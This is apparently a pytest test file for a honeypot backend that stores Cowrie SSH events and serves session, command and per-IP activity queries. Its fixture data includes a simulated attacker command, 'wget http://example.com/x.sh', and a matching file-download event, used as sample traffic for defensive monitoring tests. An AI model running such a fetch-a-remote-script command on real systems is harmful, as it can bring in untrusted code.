"""The session, command and per IP queries over HTTP (RF-08, RF-09, RF-10).

Each of them is a grouped read over the same events table, so the fixtures here
ingest a small, deliberately uneven batch: two sessions, one of them with a
failed login, and two source addresses.
"""

from __future__ import annotations

from collections.abc import AsyncIterator
from dataclasses import dataclass

import httpx
import pytest
from fastapi import FastAPI

from honeypot_backend.app import create_app
from honeypot_backend.config import Settings

#: Two sessions from two addresses, plus a failed login and two commands, which
#: is the minimum that makes every counter in RF-08, RF-09 and RF-10 non zero.
BATCH_EVENTS = [
    {
        "eventid": "cowrie.session.connect",
        "timestamp": "2026-03-01T11:59:00.000000Z",
        "session": "sess-1",
        "src_ip": "203.0.113.10",
        "protocol": "ssh",
    },
    {
        "eventid": "cowrie.login.failed",
        "timestamp": "2026-03-01T12:00:00.000000Z",
        "session": "sess-1",
        "src_ip": "203.0.113.10",
        "username": "root",
        "protocol": "ssh",
    },
    {
        "eventid": "cowrie.command.input",
        "timestamp": "2026-03-01T12:01:00.000000Z",
        "session": "sess-2",
        "src_ip": "198.51.100.4",
        "username": "oracle",
        "input": "wget http://example.com/x.sh",
        "protocol": "ssh",
    },
    {
        "eventid": "cowrie.session.file_download",
        "timestamp": "2026-03-01T12:02:00.000000Z",
        "session": "sess-2",
        "src_ip": "198.51.100.4",
        "username": "oracle",
        "url": "http://example.com/x.sh",
        "protocol": "ssh",
    },
]


@dataclass
class Backend:
    app: FastAPI
    client: httpx.AsyncClient

    async def ingest(self, cowrie_event) -> int:
        batch = {
            "agent_id": "agent-1",
            "batch_id": "batch-1",
            "events": [cowrie_event(**event) for event in BATCH_EVENTS],
        }
        response = await self.client.post("/api/v1/ingest/events", json=batch)
        assert response.status_code == 202, response.text
        return await self.app.state.replayer.run_once()


@pytest.fixture
async def backend(settings: Settings, engine, cowrie_event) -> AsyncIterator[Backend]:
    app = create_app(settings)
    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://backend") as client:
            yield Backend(app=app, client=client)


# RF-08


async def test_sessions_report_identifier_ip_span_and_duration(backend, cowrie_event) -> None:
    assert await backend.ingest(cowrie_event) == 4

    response = await backend.client.get("/api/v1/sessions", params={"order": "asc"})

    assert response.status_code == 200
    payload = response.json()
    assert payload["total"] == 2
    by_id = {item["session_id"]: item for item in payload["items"]}
    assert set(by_id) == {"sess-1", "sess-2"}

    first = by_id["sess-1"]
    assert first["source_ip"] == "203.0.113.10"
    assert first["first_seen"] == "2026-03-01T11:59:00+00:00"
    assert first["last_seen"] == "2026-03-01T12:00:00+00:00"
    assert first["duration_ms"] == 60_000
    assert first["event_count"] == 2
    assert first["usernames"] == ["root"]
    assert first["protocols"] == ["ssh"]
    assert first["has_authentication"] is True
    # Only a failed login, so the session has no successful outcome.
    assert first["has_success"] is False


async def test_sessions_are_ordered_by_their_last_event(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    response = await backend.client.get("/api/v1/sessions")

    assert [item["session_id"] for item in response.json()["items"]] == ["sess-2", "sess-1"]


async def test_sessions_can_be_filtered_by_address_and_username(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    by_ip = await backend.client.get("/api/v1/sessions", params={"source_ip": "203.0.113.10"})
    by_user = await backend.client.get("/api/v1/sessions", params={"username": "oracle"})

    assert by_ip.json()["total"] == 1
    assert by_ip.json()["items"][0]["session_id"] == "sess-1"
    assert by_user.json()["total"] == 1
    assert by_user.json()["items"][0]["session_id"] == "sess-2"


async def test_sessions_are_paged(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    first = await backend.client.get("/api/v1/sessions", params={"limit": 1})
    second = await backend.client.get(
        "/api/v1/sessions", params={"limit": 1, "offset": 1}
    )

    assert first.json()["total"] == second.json()["total"] == 2
    assert first.json()["items"][0]["session_id"] != second.json()["items"][0]["session_id"]


# RF-09


async def test_commands_report_the_text_time_address_and_session(backend, cowrie_event) -> None:
    assert await backend.ingest(cowrie_event) == 4

    response = await backend.client.get("/api/v1/commands")

    assert response.status_code == 200
    payload = response.json()
    assert payload["total"] == 1
    command = payload["items"][0]
    assert command["command"] == "wget"
    assert command["command_line"] == "wget http://example.com/x.sh"
    assert command["occurred_at"] == "2026-03-01T12:01:00+00:00"
    assert command["source_ip"] == "198.51.100.4"
    assert command["session_id"] == "sess-2"
    assert command["username"] == "oracle"
    assert command["event_type"] == "command.input"
    assert command["event_id"]


async def test_only_command_category_events_are_listed(backend, cowrie_event) -> None:
    """The transfer event of the same session is not a command."""

    await backend.ingest(cowrie_event)

    response = await backend.client.get("/api/v1/commands")

    assert all(item["event_type"].startswith("command.") for item in response.json()["items"])


async def test_commands_can_be_filtered_by_session_and_free_text(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    by_session = await backend.client.get("/api/v1/commands", params={"session_id": "sess-1"})
    by_text = await backend.client.get("/api/v1/commands", params={"q": "wget"})

    assert by_session.json()["total"] == 0
    assert by_text.json()["total"] == 1


async def test_commands_fall_back_to_the_line_when_no_command_was_parsed(
    backend, cowrie_event
) -> None:
    await backend.ingest(cowrie_event)

    response = await backend.client.get("/api/v1/commands", params={"q": "wget"})

    assert response.json()["items"][0]["command_line"].endswith("x.sh")


# RF-10


async def test_source_activity_reports_counts_sessions_auth_and_commands(
    backend, cowrie_event
) -> None:
    assert await backend.ingest(cowrie_event) == 4

    response = await backend.client.get("/api/v1/sources")

    assert response.status_code == 200
    payload = response.json()
    assert payload["total"] == 2
    by_ip = {item["source_ip"]: item for item in payload["items"]}

    first = by_ip["203.0.113.10"]
    assert first["event_count"] == 2
    assert first["session_count"] == 1
    assert first["auth_attempts"] == 1
    assert first["commands"] == 0
    assert first["transfers"] == 0
    assert first["failures"] == 1
    assert first["usernames"] == ["root"]

    second = by_ip["198.51.100.4"]
    assert second["event_count"] == 2
    assert second["session_count"] == 1
    assert second["auth_attempts"] == 0
    assert second["commands"] == 1
    assert second["transfers"] == 1
    assert second["usernames"] == ["oracle"]


async def test_sources_are_ordered_by_how_much_they_did(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    response = await backend.client.get("/api/v1/sources")

    counts = [item["event_count"] for item in response.json()["items"]]
    assert counts == sorted(counts, reverse=True)


async def test_one_source_can_be_read_with_its_category_breakdown(
    backend, cowrie_event
) -> None:
    await backend.ingest(cowrie_event)

    response = await backend.client.get("/api/v1/sources/203.0.113.10")

    assert response.status_code == 200
    payload = response.json()
    assert payload["source_ip"] == "203.0.113.10"
    assert payload["event_count"] == 2
    breakdown = {entry["key"]: entry["count"] for entry in payload["by_category"]}
    assert breakdown == {"session": 1, "authentication": 1}


async def test_an_address_without_events_is_reported_as_missing(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    response = await backend.client.get("/api/v1/sources/203.0.113.99")

    assert response.status_code == 404
    assert "203.0.113.99" in response.json()["detail"]


async def test_an_invalid_source_address_is_rejected(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    response = await backend.client.get("/api/v1/sources/not-an-ip")

    assert response.status_code == 422
    assert "not a valid IP address" in response.json()["detail"]
